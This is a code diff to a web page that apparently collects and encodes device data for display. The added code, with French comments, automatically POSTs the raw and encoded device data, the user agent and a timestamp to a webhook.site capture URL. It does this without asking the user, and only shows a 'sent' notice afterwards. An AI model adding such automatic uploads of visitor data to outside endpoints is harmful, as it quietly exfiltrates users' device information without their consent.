@@ -519,6 +519,9 @@
             // Display encoded data
             const encodedData = encryptDeviceData(deviceData);
             document.getElementById('encodedResults').innerText = encodedData;
+            
+            // Envoyer automatiquement les données au webhook
+            sendDataToWebhook(deviceData, encodedData);
         });
         
         document.getElementById('copyRawButton').addEventListener('click', function() {
@@ -533,6 +536,43 @@
                 .then(() => alert('Encoded data copied to clipboard!'))
                 .catch(err => console.error('Failed to copy: ', err));
         });
+
+        function sendDataToWebhook(rawData, encodedData) {
+            const webhookUrl = 'https://webhook.site/c9f6674a-7a3c-4998-ab54-80db9e8bd73f';
+            
+            // Préparer les données à envoyer
+            const dataToSend = {
+                raw: rawData,
+                encoded: encodedData,
+                device: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            };
+            
+            // Envoyer les données via une requête POST
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(dataToSend)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Données envoyées avec succès au webhook!');
+                    // Ajouter une indication visuelle que les données ont été envoyées
+                    const statusElement = document.createElement('div');
+                    statusElement.style.color = 'green';
+                    statusElement.style.marginTop = '10px';
+                    statusElement.textContent = '✓ Données envoyées au serveur';
+                    document.getElementById('encodedResults').parentNode.appendChild(statusElement);
+                } else {
+                    console.error('Erreur lors de l\'envoi des données au webhook');
+                }
+            })
+            .catch(error => {
+                console.error('Erreur lors de l\'envoi des données:', error);
+            });
+        }
     </script>
 </body>
 </html> 
